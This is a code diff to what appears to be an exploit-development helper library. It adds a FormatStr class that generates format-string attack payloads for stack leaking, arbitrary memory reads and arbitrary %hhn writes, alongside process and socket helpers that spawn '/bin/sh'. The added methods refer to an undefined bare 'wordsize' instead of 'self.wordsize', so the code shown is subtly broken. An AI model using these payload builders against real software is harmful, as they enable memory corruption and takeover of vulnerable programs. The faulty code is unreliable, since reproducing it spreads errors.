@@ -438,6 +438,45 @@ class Shellcode:
         return buf
 
 
+class FormatStr:
+    def __init__(self, offset=0, wordsize=4):
+        self.offset = offset
+        self.wordsize = wordsize
+
+    def dump_stack(self, size):
+        buf = 'A' * self.wordsize
+        while len(buf) < size:
+            buf += '.%016x' if wordsize == 8 else '.%08x'
+        return buf[:size]
+
+    def gets(self, addr):
+        if wordsize == 8:
+            buf = struct.pack('<Q', addr)
+        else:
+            buf = struct.pack('<I', addr)
+        buf += "%%%d$s" % self.offset
+        return buf
+
+    def write4(self, addr, value):
+        if wordsize == 8:
+            buf = struct.pack('<QQQQ', addr, addr+1, addr+2, addr+3)
+        else:
+            buf = struct.pack('<IIII', addr, addr+1, addr+2, addr+3)
+
+        n = map(ord, struct.pack('<I', value))
+        n[3] = ((n[3]-n[2]-1) % 0x100) + 1
+        n[2] = ((n[2]-n[1]-1) % 0x100) + 1
+        n[1] = ((n[1]-n[0]-1) % 0x100) + 1
+        n[0] = ((n[0]-len(buf)-1) % 0x100) + 1
+
+        buf += '%%%dc%%%d$hhn' % (n[0], self.offset)
+        buf += '%%%dc%%%d$hhn' % (n[1], self.offset+1)
+        buf += '%%%dc%%%d$hhn' % (n[2], self.offset+2)
+        buf += '%%%dc%%%d$hhn' % (n[3], self.offset+3)
+
+        return buf
+
+
 class Proc:
     def __init__(self, *args, **kwargs):
         if 'host' in kwargs and 'port' in kwargs:
@@ -446,7 +485,7 @@ class Proc:
             self.p = Popen(args, stdin=PIPE, stdout=PIPE)
 
     def write(self, s):
-        time.sleep(1e-3)
+        time.sleep(0.1)
         if isinstance(self.p, Popen):
             return self.p.stdin.write(s)
         else:
@@ -471,6 +510,12 @@ class Proc:
         if isinstance(self.p, Popen):
             self.write('exec /bin/sh <&2 >&2\n')
         self.wait()
+
+    def close(self):
+        if isinstance(self.p, Popen):
+            self.p.terminate()
+        else:
+            self.p.close()
 
     def write_p64(self, s):
         return self.write(p64(s))
